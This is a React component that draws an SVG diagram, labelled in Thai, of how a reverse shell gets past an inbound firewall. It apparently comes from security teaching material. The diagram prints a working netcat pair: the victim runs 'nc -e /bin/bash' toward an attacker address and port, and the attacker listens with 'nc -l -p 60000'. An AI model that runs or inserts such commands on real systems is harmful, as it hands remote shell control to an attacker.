// a reverse shell: the victim dials out to the attacker, so an inbound firewall never sees it
export function ReverseShell() {
  const mono = 'ui-monospace, SFMono-Regular, Menlo, monospace';
  return (
    <svg
      viewBox="0 0 620 286"
      role="img"
      aria-label="เครื่องเหยื่ออยู่ซ้าย เครื่องคนร้ายอยู่ขวา มีไฟร์วอลล์คั่นกลางที่ปิดขาเข้า ขั้นที่ 1 คนร้ายเปิด nc ฟังพอร์ต 60000 ก่อน ขั้นที่ 2 เหยื่อรัน nc -e /bin/bash ต่อสายขาออกไปหาคนร้าย ไฟร์วอลล์จึงปล่อยผ่าน ขั้นที่ 3 คำสั่งของคนร้ายวิ่งเข้าไปรันใน /bin/bash ของเหยื่อ และผลลัพธ์วิ่งกลับออกมา"
      className="mx-auto h-auto w-full min-w-[590px]"
      fill="currentColor"
    >
      {/* victim box */}
      <rect x="18" y="58" width="178" height="150" rx="10" fillOpacity="0.14" stroke="currentColor" strokeOpacity="0.55" />
      <text x="107" y="84" textAnchor="middle" fontSize="12" fontWeight="600">เครื่องเหยื่อ (ในวง)</text>
      <text x="107" y="128" textAnchor="middle" fontSize="11" fontFamily={mono} opacity="0.85">nc.traditional</text>
      <text x="107" y="146" textAnchor="middle" fontSize="11" fontFamily={mono} opacity="0.85">-e /bin/bash</text>
      <text x="107" y="164" textAnchor="middle" fontSize="11" fontFamily={mono} opacity="0.85">192.168.0.121 60000</text>
      <text x="107" y="192" textAnchor="middle" fontSize="11" opacity="0.7">/bin/bash ถูกต่อเข้ากับสาย</text>

      {/* firewall */}
      <line x1="310" y1="44" x2="310" y2="214" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.3" strokeDasharray="4 4" />
      <text x="310" y="36" textAnchor="middle" fontSize="11" opacity="0.78">ไฟร์วอลล์ปิดขาเข้า</text>

      {/* attacker box */}
      <rect x="424" y="58" width="178" height="150" rx="10" fillOpacity="0.28" stroke="currentColor" strokeOpacity="0.6" />
      <text x="513" y="84" textAnchor="middle" fontSize="12" fontWeight="600">เครื่องคนร้าย</text>
      <rect x="436" y="134" width="24" height="18" rx="5" fillOpacity="0.14" stroke="currentColor" strokeOpacity="0.6" />
      <text x="448" y="147" textAnchor="middle" fontSize="11" fontWeight="700">1</text>
      <text x="526" y="147" textAnchor="middle" fontSize="11" fontFamily={mono} opacity="0.85">nc -l -p 60000</text>
      <text x="513" y="174" textAnchor="middle" fontSize="11" opacity="0.7">เปิดพอร์ตฟังรออยู่ก่อน</text>

      {/* step 2: victim dials out to attacker, crossing the firewall */}
      <line x1="196" y1="104" x2="422" y2="104" stroke="currentColor" strokeOpacity="0.78" strokeWidth="1.7" markerEnd="url(#rs-arrow)" />
      <text x="253" y="94" textAnchor="middle" fontSize="11" opacity="0.85">2 · ต่อสายขาออก</text>
      <text x="367" y="94" textAnchor="middle" fontSize="11" opacity="0.85">ไฟร์วอลล์ปล่อยผ่าน</text>

      {/* step 3: commands flow back into the victim shell */}
      <line x1="424" y1="184" x2="198" y2="184" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.3" strokeDasharray="5 4" markerEnd="url(#rs-arrow)" />
      <text x="253" y="202" textAnchor="middle" fontSize="11" opacity="0.8">3 · คำสั่งวิ่งกลับ</text>
      <text x="367" y="202" textAnchor="middle" fontSize="11" opacity="0.8">เข้าไปรันในเชลล์เหยื่อ</text>

      {/* legend */}
      <text x="18" y="244" fontSize="11" opacity="0.82">1 คนร้ายเปิดพอร์ตฟังรอ · 2 เหยื่อต่อสายออกไปหา · 3 คนร้ายสั่งงานเครื่องเหยื่อ ผลลัพธ์วิ่งกลับ</text>
      <text x="18" y="266" fontSize="11" opacity="0.72">ในภาพนี้ คนร้ายเป็นฝ่ายฟังพอร์ตและสั่งงาน ส่วนเหยื่อเป็นฝ่ายต่อออกและมอบเชลล์ของตัวเอง</text>

      <defs>
        <marker id="rs-arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse">
          <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" fillOpacity="0.72" />
        </marker>
      </defs>
    </svg>
  );
}
